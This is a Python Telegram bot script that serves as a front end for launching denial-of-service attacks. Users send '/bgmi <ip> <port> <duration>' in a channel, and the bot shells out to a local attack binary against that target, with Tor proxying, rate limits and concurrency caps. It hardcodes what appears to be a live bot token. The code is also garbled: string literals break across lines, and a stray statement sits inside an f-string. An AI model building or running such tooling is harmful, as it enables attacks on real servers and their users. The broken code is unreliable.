
# === SOCKS5 Proxy Setup ===
import requests
from telebot import apihelper

# Use SOCKS5 proxy (Tor)
proxies = {
    'http': 'socks5h://127.0.0.1:9052',
    'https': 'socks5h://127.0.0.1:9052'
}
apihelper.proxy = proxies

# Optional: Proxy test at bot start
try:
    r = requests.get('https://check.torproject.org', proxies=proxies, timeout=10)
    print("[Proxy Test] Status Code:", r.status_code)
    if "Congratulations" in r.text:
        print("[Proxy Test] Successfully routed through Tor!")
except Exception as e:
    print("[Proxy Test] Proxy error:", e)

import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel ID
TOKEN = '7848878988:AAH80Xh92KSgTuUEQOd1OUwLqf3U7aNmNiE'
CHANNEL_ID = '-1002678249799'
bot = telebot.TeleBot(TOKEN)

user_attacks = {}
user_cooldowns = {}
user_photos = {}
user_bans = {}
active_attackers = set()  # Track users currently running attacks
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)

COOLDOWN_DURATION = 60
BAN_DURATION = timedelta(minutes=1)
DAILY_ATTACK_LIMIT = 15
EXEMPTED_USERS = [5712886230]

def reset_daily_counts():
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)

def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    user_photos[user_id] = True
    bot.send_message(message.chat.id, "✅ 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝗿𝗲𝗰𝗲𝗶𝘃𝗲𝗱! 𝗙𝗲𝗲𝗹 𝗳𝗿𝗲𝗲 𝘁𝗼 𝘂𝘀𝗲 /bgmi 𝗮𝗴𝗮𝗶𝗻.")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " ⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 𝐂𝐎𝐌𝐄 𝐈𝐍 𝐆𝐑𝐎𝐔𝐏 :- @freebotalone ⚠️")
        return

    reset_daily_counts()

    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 60)
            bot.send_message(message.chat.id, f"⚠️ 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)}m {int(seconds)}s.")
            return
        else:
            del user_bans[user_id]

    if user_id not in EXEMPTED_USERS:
        if user_id in user_cooldowns and datetime.now() < user_cooldowns[user_id]:
            remaining_time = (user_cooldowns[user_id] - datetime.now()).seconds
            bot.send_message(message.chat.id, f"⚠️ 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙒𝙖𝙞𝙩 {remaining_time}s.")
            return

        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(message.chat.id, "⛔ 𝘿𝙖𝙞𝙡𝙮 𝙡𝙞𝙢𝙞𝙩 𝙧𝙚𝙖𝙘𝙝𝙚𝙙.")
            return

        if user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION
            bot.send_message(message.chat.id, "⚠️ 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙣𝙤𝙩 𝙧𝙚𝙘𝙚𝙞𝙫𝙚𝙙. 𝘽𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 1 𝙢𝙞𝙣𝙪𝙩𝙚.")
            return

    try:
        args = message.text.split()[1:]
        if len(args) != 3:
            raise ValueError("┊★ȺŁØNɆ☂࿐ꔪ┊™ Dildos 💞 𝗕𝗢𝗧 𝗔𝗖𝗧𝗶𝗩𝗘 ✅ \n\n ⚙ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙁𝙤𝙧𝙢𝙖𝙩: /bgmi <ip> <port> <duration>")

        ip, port, dur = args
        if not is_valid_ip(ip): raise ValueError("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙄𝙋.")
        if not is_valid_port(port): raise ValueError("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙥𝙤𝙧𝙩.")
        if not is_valid_duration(dur): raise ValueError("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣.")
        if int(dur) > 240: raise ValueError("⛔ 𝙈𝙖𝙭 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣: 240s.")

        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        bot.send_message(message.chat.id, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙨𝙩𝙖𝙧𝙩𝙚𝙙

REQUESTED 𝗜𝗣: {ip}
REQUESTED 𝗣𝗼𝗿𝘁: {port}
REQUESTED 𝗧𝗶𝗺𝗲: {dur}s

📢 𝗦𝗲𝗻𝗱 𝗳𝗲𝗲𝗱𝗯𝗮𝗰𝗸 (𝗮 𝗽𝗵𝗼𝘁𝗼) 𝗼𝗻𝗰𝗲 𝗱𝗼𝗻𝗲!")


        if user_id not in EXEMPTED_USERS and len(active_attackers) >= 3 and user_id not in active_attackers:
            bot.send_message(message.chat.id, "⚠️ Currently 3 users are attacking. Please wait until one finishes.")
            return
        active_attackers.add(user_id)

        asyncio.run(run_attack_command_async(ip, int(port), int(dur), dur, user_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(ip, port, duration, user_duration, user_name):
    try:
        command = f"./fuck {ip} {port} {duration}"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"✅ 𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙

        active_attackers.discard(user_id)
𝗜𝗣: {ip}
𝗣𝗼𝗿𝘁: {port}
𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {user_duration}sec ")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

if __name__ == "__main__":
    logging.info("Bot is starting...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Polling crashed: {e}")